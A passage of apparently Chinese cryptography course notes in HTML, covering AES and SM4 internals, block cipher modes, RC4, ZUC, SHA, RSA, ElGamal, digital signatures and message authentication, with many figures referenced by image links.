title="解密算法"></a>解密算法</h3><blockquote><p>AES算法的解密过程中依次进行逆字节代换，逆行移位，逆列混合和轮密钥加。</p><ul><li>InvByteSub()是ByteSub()的逆变换，通过查逆S盒来实现。</li><li>InvShiftRow()是ShiftRow()的逆变换，对State的各行进行一定量的循环移位(Nb=4)。第0行不移位，第1行循环右移1个字节，第2行循环右移2个字节，第三行右移3个字节。</li><li>InvMixColumn()是MixColumn()的逆变换。</li><li>AddRoundKey的逆就是他本身。</li></ul></blockquote><h3 id="AES算法的安全性"><a href="#AES算法的安全性" class="headerlink" title="AES算法的安全性"></a>AES算法的安全性</h3><blockquote><ul><li><strong>不存在弱密钥</strong><br>该算法对密钥的选择没有任何限制，还没有发现弱密钥和半弱密钥的存在。</li><li><strong>抗攻击能力强</strong><br>可抵抗穷举法密钥的攻击，密钥量为2<sup>128</sup>/2<sup>192</sup>/2<sup>256</sup>,足以抵抗穷举攻击。<br>可抵抗线性攻击(已知明文攻击)，经4轮变换后，线性分析就无能为力了。<br>可抵抗差分攻击(选择明文攻击)，经8轮变换后，差分攻击就无从着手了。</li><li><strong>适应性强</strong><br>Rijindael的数据库长度和密钥长度都可变，因此能够适应不同的安全应用环境。</li></ul></blockquote><p><br><br><br></p><h2 id="SM4算法"><a href="#SM4算法" class="headerlink" title="SM4算法"></a>SM4算法</h2><ul><li>简介<ul><li>我国国家密码管理局公布的<strong>无线局域网</strong>产品使用的密码算法。</li><li>数据分组为128位，密钥长度为128位，迭代32次。</li><li>数据处理单位：字节(8位)，字(32位)。</li></ul></li><li>特点<ul><li>对合运算：解密算法和加密算法结构相同</li><li>子密钥生成算法与加密算法结构类似</li></ul></li><li>结构<ul><li>采用非对称Feistel结构。</li></ul></li></ul><h3 id="基本运算"><a href="#基本运算" class="headerlink" title="基本运算"></a>基本运算</h3><ul><li>模2加：$\bigoplus$，32位异或运算</li><li>循环移位：&lt;&lt;&lt;i，把32位字循环左移i位</li></ul><h3 id="基本密码部件"><a href="#基本密码部件" class="headerlink" title="基本密码部件"></a>基本密码部件</h3><ol><li><strong>S盒：</strong><ul><li>非线性<strong>字节</strong>变换，起混淆作用</li><li>8位输入，8位输出。</li><li>本质上是8位的非线性置换。</li><li>设输入字节为a，输出字节为b，则S盒的运算可表示为：b=S_Box(a)</li><li>S盒置换规则<br>  以输入的<strong>高半字节为行号，低半字节为列号</strong>，行列交叉点的数据即为输出。<br>  例：设S盒的输入为EF，则S盒的输出为E行F列交叉点的值，即<br>  Sbox(‘ef’)=’84’<br>  说明：在主要密码学指标上达到最佳，与AES的S盒相当</li></ul></li></ol><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-14-53-14.png" alt="SM4密码算法S盒数据表" title="" class="">                <p>SM4密码算法S盒数据表</p>            </figure><p><br></p><ol start="2"><li><strong>非线性变换$τ$:起混淆作用</strong><br>4个S和并行置换<br>设输入字$A=(a_0,a_1,a_2,a_3)$,输出字$B=(b_0,b_1,b_2,b_3)$<br>B=τ(A)=(S_box(a<sub>0</sub>),S_box(a<sub>1</sub>), S_box(a<sub>2</sub>),S_box(a<sub>3</sub>))</li></ol><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-15-29-37.png" alt="非线性变换$τ$" title="" class="">                <p>非线性变换$τ$</p>            </figure><p><br></p><ol start="3"><li><strong>字线性部件L变换：起扩散作用</strong></li></ol><ul><li>32位输入，32位输出。</li><li>设输入为字B，输出为字C，则<br>$C=L(B)=B \bigoplus (B&lt;&lt;&lt;2) \bigoplus (B&lt;&lt;&lt;10) \bigoplus (B&lt;&lt;&lt;18) \bigoplus (B&lt;&lt;&lt;24)$</li></ul><ol start="4"><li><strong>字合成变换$τ$：</strong></li></ol><ul><li>由非线性变换$τ$和线性变换L复合而成。<br>$T(x)=L(τ(A))$<br><strong>先S变换，再L变换</strong></li></ul><p><br></p><h3 id="轮函数-1"><a href="#轮函数-1" class="headerlink" title="轮函数"></a>轮函数</h3><ul><li>输入数据：$(x_0,x_1,x_2,x_3)$，128位，四个32位字。</li><li>输入轮密钥：rk，32位字。</li><li>输出数据32位字。</li><li>轮函数：$F(x_0,x_1,x_2,x_3)=x_0 \bigoplus T((x_1 \bigoplus x_2 \bigoplus x_3 \bigoplus rk))$</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-15-37-34.png" alt="轮函数" title="" class="">                <p>轮函数</p>            </figure><p><br></p><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><ul><li>输入明文：$(M_0,M_1,M_2,M_3)=(X_0,X_1,X_2,X_3)$四个字，128位。</li><li>输入轮密钥：$rk_i,i=0,1,……,31$，共32个轮密钥。</li><li>输出密文：$(Y_0,Y_1,Y_2,Y_3)$，四个字，128位。</li><li>算法结构：轮函数32轮迭代，每轮使用一个轮密钥。</li><li>加密算法：<ul><li>加密变换 $X_{i+4}=F(x_i,x_{i+1},x_{x+2},x_{i+3},rk_i)=x_i \bigoplus T(x_{i+1} \bigoplus x_{i+2} \bigoplus x_{i+3} \bigoplus rk_i,i=0,1…31)$</li><li>反序变换：$(Y_0,Y_1,Y_2,Y_3)=(X_{35},X_{34},X_{33},X_{32})$</li></ul></li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-16-19-20.png" alt="加密算法" title="" class="">                <p>加密算法</p>            </figure><p><br></p><h3 id="解密算法-1"><a href="#解密算法-1" class="headerlink" title="解密算法"></a>解密算法</h3><ul><li>SM4密码算法是对合的，因此解密与加密算法相同，只是轮密钥的使用顺序相反。</li><li>输入密文：$(Y_0,Y_1,Y_2,Y_3)=(X_35,X_34,X_33，X_32)$</li><li>输入轮密钥：$rk_i,i=31,30,……,0$</li><li>输出明文：(X_0,X_1,X_2,X_3)</li><li>算法：轮函数的32轮迭代，每轮使用一个轮密钥</li><li>解密算法：用符号X描述</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-16-55-38.png" alt="解密算法" title="" class="">                <p>解密算法</p>            </figure><p><br></p><h3 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h3><ol><li><p>常数FK<br>在密钥扩展中使用一些常数(32位字)；<br>$FK_0=(A3B1BAC6)$<br>$FK_1=(56AA3350)$<br>$FK_2=(677D9197)$<br>$FK_3=(B27022DC)$</p></li><li><p>固定参数CK，32位：32个固定参数CK<sub>i</sub>,i=0,1,2,…,31</p></li></ol><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-17-01-15.png" alt="固定参数CK" title="" class="">                <p>固定参数CK</p>            </figure><ul><li>输入加密密钥：$MK=(MK_0,MK_1,MK_2,MK_3)$</li><li>输出轮密钥：$rk_i,i=0,1,…,30,31$</li><li>中间数据：$K_i,i=0,1,…,34,35$</li><li>密钥扩展算法：</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-10-17-04-34.png" alt="密钥扩展算法" title="" class="">                <p>密钥扩展算法</p>            </figure><h3 id="SM4密码结构"><a href="#SM4密码结构" class="headerlink" title="SM4密码结构"></a>SM4密码结构</h3><ul><li>SM4密码与DES密码有相似性</li><li>DES密码采用的是Feistel结构，SM4也采用Feistel结构。</li><li>DES中参与交换的两个数据块的长度也是相等的，而在SM4中参与交换的两个数据块的长度是不相等的。</li><li>因此，密码届称DES密码采用的是对称Feistel结构，SM4密码采用的是非对称Feistel结构。</li></ul><p><br><br><br></p><h2 id="分组密码工作模式"><a href="#分组密码工作模式" class="headerlink" title="分组密码工作模式"></a>分组密码工作模式</h2><ul><li>分组密码可以按不同的模式工作，实际应用的环境不同应采用不同的工作模式。只有这样才能既确保安全，又方便高效。</li></ul><h3 id="电子密码本-ECB"><a href="#电子密码本-ECB" class="headerlink" title="电子密码本(ECB)"></a>电子密码本(ECB)</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-09-58-00.png" alt="ECB" title="" class="">                <p>ECB</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-10-58-37.png" alt="ECB加密" title="" class="">                <p>ECB加密</p>            </figure><p><strong>特点</strong></p><ul><li>数据的长度是密码分组长度的整数倍</li><li>容易暴露明文的数据模式</li><li>由于所有数据块分组的加密方式一致，难以抵抗统计分析攻击</li><li>操作简单，容易实现</li><li>由于每个块的加密和解密都是独立的，可并行进行加密</li></ul><p><br></p><h3 id="密码块链接-CBC"><a href="#密码块链接-CBC" class="headerlink" title="密码块链接(CBC)"></a>密码块链接(CBC)</h3><h4 id="明密文链接模式"><a href="#明密文链接模式" class="headerlink" title="明密文链接模式"></a>明密文链接模式</h4><ul><li>解决了ECB的安全缺陷，可以让重复的明文分组产生不同的密文分组，可以抵御重放攻击。</li><li>适合传输数据长度大的报文</li><li>加解密传播无界，加密时，当明文块或密文块中发生一位错误时，自此以后的密文都发生错误</li><li>数据的长度是密码分组的整数倍</li><li>不能进行并行加密</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-11-00-33.png" alt="明密文链接模式" title="" class="">                <p>明密文链接模式</p>            </figure><h4 id="密文链接模式"><a href="#密文链接模式" class="headerlink" title="密文链接模式"></a>密文链接模式</h4><ul><li>使用了不同的初始向量组，完全相同的明文在加密之后可以得到不同的密文，可以抵御重放攻击</li><li>适合传输数据长度大的报文</li><li>加密传播无界，但解密传播有界，解密时，当密文块中发生一位错误时，只影响其中相应解密的明文，其余不会发生错误，适合磁盘文件加解密</li><li>数据的长度是密码分组的整数倍</li><li>不能进行并行加密</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-11-13-55.png" alt="密文链接模式" title="" class="">                <p>密文链接模式</p>            </figure><h4 id="CBC特点"><a href="#CBC特点" class="headerlink" title="CBC特点"></a>CBC特点</h4><ul><li>解决了ECB的安全缺陷，可以让重复的明文分组产生不同的密文分组，可以抵御重放攻击。</li><li>适合传输数据长度大的报文</li><li>明密文链接模式加解密传播无界；密文链接模式加密错误传播无界，解密错误传播有界</li><li>数据的长度是密码分组的整数倍</li><li>不能进行并行加密</li></ul><p><br></p><h3 id="填充密码块链接-PCBC"><a href="#填充密码块链接-PCBC" class="headerlink" title="填充密码块链接(PCBC)"></a>填充密码块链接(PCBC)</h3><p><br></p><h3 id="输出反馈-OFB"><a href="#输出反馈-OFB" class="headerlink" title="输出反馈(OFB)"></a>输出反馈(OFB)</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-14-38-47.png" alt="OFB" title="" class="">                <p>OFB</p>            </figure><p><br></p><h3 id="密文反馈-CFB"><a href="#密文反馈-CFB" class="headerlink" title="密文反馈(CFB)"></a>密文反馈(CFB)</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-14-59-34.png" alt="CFB" title="" class="">                <p>CFB</p>            </figure><p><br></p><h3 id="计数器模式-CTR"><a href="#计数器模式-CTR" class="headerlink" title="计数器模式(CTR)"></a>计数器模式(CTR)</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-03-03.png" alt="CTR" title="" class="">                <p>CTR</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-05-01.png" alt="CTR特点" title="" class="">                <p>CTR特点</p>            </figure><p><br></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-09-41.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-11-07.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-11-32-33.png" alt="例题3" title="" class="">                <p>例题3</p>            </figure><ol><li>明密文链接模式</li><li>加解密错误传播无界<br>数据的长度是密码分组的整数倍</li></ol><p><br><br><br></p><h1 id="序列密码"><a href="#序列密码" class="headerlink" title="序列密码"></a>序列密码</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-15-55.png" alt="概念" title="" class="">                <p>概念</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-20-49.png" alt="与分组密码的区别" title="" class="">                <p>与分组密码的区别</p>            </figure><p><br></p><h2 id="RC4序列密码"><a href="#RC4序列密码" class="headerlink" title="RC4序列密码"></a>RC4序列密码</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-21-40.png" alt="rc4" title="" class="">                <p>rc4</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-32-32.png" alt="KSA算法1" title="" class="">                <p>KSA算法1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-41-43.png" alt="KSA算法2" title="" class="">                <p>KSA算法2</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-44-26.png" alt="PRGA算法1" title="" class="">                <p>PRGA算法1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-46-25.png" alt="PRGA算法2" title="" class="">                <p>PRGA算法2</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-50-53.png" alt="RC4的安全性" title="" class="">                <p>RC4的安全性</p>            </figure><p><br></p><h2 id="ZUC算法"><a href="#ZUC算法" class="headerlink" title="ZUC算法"></a>ZUC算法</h2><p>ZUC算法，又称为祖冲之算法，是移动通信3GPP机密性算法EEA3和完整性算法EIA3的核心，是中国自主设计的加密算法。<br><br></p><h2 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-54-32.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-55-20.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><p><br><br><br></p><h1 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-15-57-46.png" alt="概念" title="" class="">                <p>概念</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-04-46.png" alt="Hash函数基本设计结构" title="" class="">                <p>Hash函数基本设计结构</p>            </figure><p><br></p><h2 id="SHA算法"><a href="#SHA算法" class="headerlink" title="SHA算法"></a>SHA算法</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-06-22.png" alt="SHA算法" title="" class="">                <p>SHA算法</p>            </figure><p><strong>算法步骤</strong><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-12-56.png" alt="消息填充" title="" class="">                <p>消息填充</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-16-32.png" alt="初始化缓冲区" title="" class="">                <p>初始化缓冲区</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-17-26.png" alt="算法主循环" title="" class="">                <p>算法主循环</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-18-41.png" alt="压缩函数处理1" title="" class="">                <p>压缩函数处理1</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-21-50.png" alt="压缩函数处理2" title="" class="">                <p>压缩函数处理2</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-27-19.png" alt="压缩函数处理3" title="" class="">                <p>压缩函数处理3</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-29-03.png" alt="压缩函数处理4" title="" class="">                <p>压缩函数处理4</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-30-01.png" alt="压缩函数处理5及输出" title="" class="">                <p>压缩函数处理5及输出</p>            </figure></p><h2 id="例题-2"><a href="#例题-2" class="headerlink" title="例题"></a>例题</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-30-43.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-31-17.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-31-32.png" alt="例题3" title="" class="">                <p>例题3</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-32-32.png" alt="例题4" title="" class="">                <p>例题4</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-16-33-45.png" alt="例题5" title="" class="">                <p>例题5</p>            </figure><h1 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h1><p><strong>对称密码存在哪些局限性</strong></p><ul><li>密钥分发的问题</li><li>密钥数量的问题</li><li>数字签名问题</li></ul><h2 id="公钥密码体制模型"><a href="#公钥密码体制模型" class="headerlink" title="公钥密码体制模型"></a>公钥密码体制模型</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-19-20.png" alt="加密模型" title="" class="">                <p>加密模型</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-23-58.png" alt="认证模型" title="" class="">                <p>认证模型</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-24-48.png" alt="加密认证混合模型" title="" class="">                <p>加密认证混合模型</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-35-47.png" alt="数字信封技术" title="" class="">                <p>数字信封技术</p>            </figure><p><strong>公钥加密的安全性</strong></p><ul><li>确保数据的秘密性</li><li>确保数据的真实性</li><li>同时确保数据的秘密性和真实性</li></ul><p><strong>例题</strong><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-38-56.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-44-12.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-45-16.png" alt="例题3" title="" class="">                <p>例题3</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-49-35.png" alt="例题4" title="" class="">                <p>例题4</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-51-10.png" alt="例题5" title="" class="">                <p>例题5</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-52-51.png" alt="例题6" title="" class="">                <p>例题6</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-54-50.png" alt="例题7" title="" class="">                <p>例题7</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-20-58-55.png" alt="例题8" title="" class="">                <p>例题8</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-01-28.png" alt="例题9" title="" class="">                <p>例题9</p>            </figure></p><h2 id="RSA密码"><a href="#RSA密码" class="headerlink" title="RSA密码"></a>RSA密码</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-08-22.png" alt="相关数学基础" title="" class="">                <p>相关数学基础</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-11-37.png" alt="RSA的加密和解密" title="" class="">                <p>RSA的加密和解密</p>            </figure><ul><li>n,e公开</li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-22-07.png" alt="求解乘法逆元" title="" class="">                <p>求解乘法逆元</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-24-36.png" alt="RSA实例" title="" class="">                <p>RSA实例</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-24-58.png" alt="RSA实例体制的特点及安全性" title="" class="">                <p>RSA实例体制的特点及安全性</p>            </figure><p><br></p><h2 id="ELGamal密码"><a href="#ELGamal密码" class="headerlink" title="ELGamal密码"></a>ELGamal密码</h2><p><strong>了解</strong><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-27-18.png" alt="相关数学基础" title="" class="">                <p>相关数学基础</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-29-27.png" alt="参数定义和密钥生成" title="" class="">                <p>参数定义和密钥生成</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-30-58.png" alt="加密算法" title="" class="">                <p>加密算法</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-31-16.png" alt="解密算法" title="" class="">                <p>解密算法</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-32-17.png" alt="实例" title="" class="">                <p>实例</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-33-09.png" alt="特点和安全性" title="" class="">                <p>特点和安全性</p>            </figure><br><br></p><p><strong>例题</strong><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-34-57.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-35-36.png" alt="例题2" title="" class="">                <p>例题2</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-40-22.png" alt="例题3" title="" class="">                <p>例题3</p>            </figure><br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-41-54.png" alt="例题4" title="" class="">                <p>例题4</p>            </figure><br><br></p><h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-46-25.png" alt="数字签名的特征" title="" class="">                <p>数字签名的特征</p>            </figure><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-47-54.png" alt="RSA签名的生成和验证算法1" title="" class="">                <p>RSA签名的生成和验证算法1</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-49-04.png" alt="RSA签名的生成和验证算法2" title="" class="">                <p>RSA签名的生成和验证算法2</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-52-04.png" alt="RSA签名验证算法实例" title="" class="">                <p>RSA签名验证算法实例</p>            </figure><p><br></p><h3 id="ELGamal密码-1"><a href="#ELGamal密码-1" class="headerlink" title="ELGamal密码"></a>ELGamal密码</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-53-59.png" alt="ELGamal参数定义和密钥生成" title="" class="">                <p>ELGamal参数定义和密钥生成</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-55-41.png" alt="ELGamal签名的生成和验证算法" title="" class="">                <p>ELGamal签名的生成和验证算法</p>            </figure><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-56-02.png" alt="ELGamal签名验证算法实例" title="" class="">                <p>ELGamal签名验证算法实例</p>            </figure><p><br></p><h3 id="RSA和ELGamal签名安全性"><a href="#RSA和ELGamal签名安全性" class="headerlink" title="RSA和ELGamal签名安全性"></a>RSA和ELGamal签名安全性</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-21-56-57.png" alt="安全性" title="" class="">                <p>安全性</p>            </figure><h3 id="例题-3"><a href="#例题-3" class="headerlink" title="例题"></a>例题</h3><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-12-22-00-56.png" alt="例题1" title="" class="">                <p>例题1</p>            </figure><p><br><br><br></p><h1 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h1><h2 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h2><ul><li>认证，又称鉴别或确认，是证实某事是否名副其实或是否真实有效的一个过程。</li><li>认证和加密的区别<ul><li>加密用以确保数据的保密性，阻止对手的被动攻击，如截取、窃听等。</li><li>认证用以确保报文发送者和接受者的真实性以及报文的完整性，阻止对手的主动攻击，如冒充、篡改、重播等。</li></ul></li></ul><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Crypto/2019-05-13-20-50-55.png" alt="认证原理" title="" class="">                <p>认证原理</p>            </figure><ul><li>认证和数字签名技术的区别<ul><li>认证总是基于某种收发双方共享的保密数据来认证被鉴别对象的真实性，数字签名中用于验证签名的数据是公开的。</li><li>认证允许收发双方互相验证其真实性，不准许第三者验证，数字签名允许双方和第三者都能认证。</li><li>数字签名具有发送方不能抵赖，接收方不能伪造和具有在公证人前解决纠纷的能力，而认证不一定具备。</li></ul></li></ul><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><h3 id="口令认证"><a href="#口令认证" class="headerlink" title="口令认证"></a>口令认证</h3><ul><li>利用单向函数加密口令<br>  用户口令在系统中以密文的形式存储。只能加密，不能解密。</li><li>利用数字签名方法验证口令<br>  用户的公钥存储在系统中。系统为用户设置了时间标志T<sub>i</sub>,可以抵抗重播攻击。</li><li>口令的双向验证<br>  用户和系统相互平等地验证对方的身份<br>  选择一个单向函数f，假设A要求与B，则A和B可如下相互认证对方的身份：<ol><li>A-&gt;B:R<sub>A</sub></li><li>B-&gt;A:f(P<sub>B</sub>||R<sub>A</sub>)||R<sub>B</sub></li><li>A-&gt;B:f(P<sub>A</sub>||R<sub>B</sub>)<br>由于f是单向函数，即使知道f(P<sub>B</sub>||R<sub>A</sub>)也不能计算出P<sub>A</sub>，即使知道f(P<sub>A</sub>||R<sub>B</sub>)，也不能计算出P<sub>B</sub>。可在f函数中加入时间参数，阻止重播攻击。</li></ol></li><li>一次性口令<br>  一个口令只用一次，可以抵御重放攻击。</li></ul><h3 id="生物特征识别"><a href="#生物特征识别" class="headerlink" title="生物特征识别"></a>生物特征识别</h3><ul><li>通过识别用户的生理特征来认证用户的身份，具有唯一性和稳定性</li><li>如指纹、掌纹、面孔、发音、虹膜、视网膜、骨架等</li></ul><h2 id="报文认证"><a href="#报文认证" class="headerlink" title="报文认证"></a>报文认证</h2><p>报文认证，必须是通信方能够验证每份报文的发送方、接收方、内容和时间性的真实性和完整性</p><h3 id="报文源的认证"><a href="#报文源的认证" class="headerlink" title="报文源的认证"></a>报文源的认证</h3><ul><li>设A为报文发送方，简称为源，B是报文的接收方，简称为宿。</li><li>A与B共享保密的密钥$K_S$。A的标识为$ID_A$，要发送的报文为$M$，那么B认证A的过程如下<br>  $A-&gt;B:E(ID_A||M,K_S)$</li><li>A在发给B的每份报文中都增加标识$ID_A$，然后用$K_S$加密并发送给B。</li><li>公开密钥密码实现报文源的认证：$A-&gt;B:E(ID_A||M,K_{dA})$</li></ul><h3 id="报文宿的认证"><a href="#报文宿的认证" class="headerlink" title="报文宿的认证"></a>报文宿的认证</h3><ul><li>在以密钥为基础的认证方案的每份报文中加入接受方标识符$ID_B$<br>  $A-&gt;B:E(ID_B||M,K_S)$</li><li>公开密钥密码实现报文宿的认证：$A-&gt;B:E(ID_B||M,K_{eB})$</li></ul><h3 id="报文内容的认证"><a href="#报文内容的认证" class="headerlink" title="报文内容的认证"></a>报文内容的认证</h3><p>报文内容认证使接收方确认报文内容的真实性，通过验证认证码的正确性来实现。</p><h4 id="报文加密"><a href="#报文加密" class="headerlink" title="报文加密"></a>报文加密</h4><p>将整个报文的密文作为认证码：发送方A要发送报文给接收方B，则A用他们的共享密钥K对发送的报文M加密后发给B；<br>    $A-&gt;B:E(M,K)$</p><ul><li><strong>报文的密码性</strong>：如只有A和B知道密钥K，其他任何人均不能恢复出报文明文。</li><li><strong>报文源的认证</strong>：除B外只有A拥有K，也就只有A可产生出B能解密的密文。</li><li><strong>报文认证</strong>：如果B可以恢复出明文，则可认为M中的每一位都未被改变。</li></ul><h4 id="消息认证码-MAC"><a href="#消息认证码-MAC" class="headerlink" title="消息认证码(MAC)"></a>消息认证码(MAC)</h4><p>消息认证的实质是：发送者通过双方协商的某种函数(如Hash函数)，以待发消息作为输入经过函数变换产生消息认证码(简称MAC)。<br>    $MAC=C(M,K)$<br>    $A-&gt;B:E(M||C(M,K_1),K_2)$<br>    $A-&gt;B:E(M,K_2)||C(E(M,K_2),K_1)$</p><h4 id="基于hash函数的消息认证码-HMAC"><a href="#基于hash函数的消息认证码-HMAC" class="headerlink" 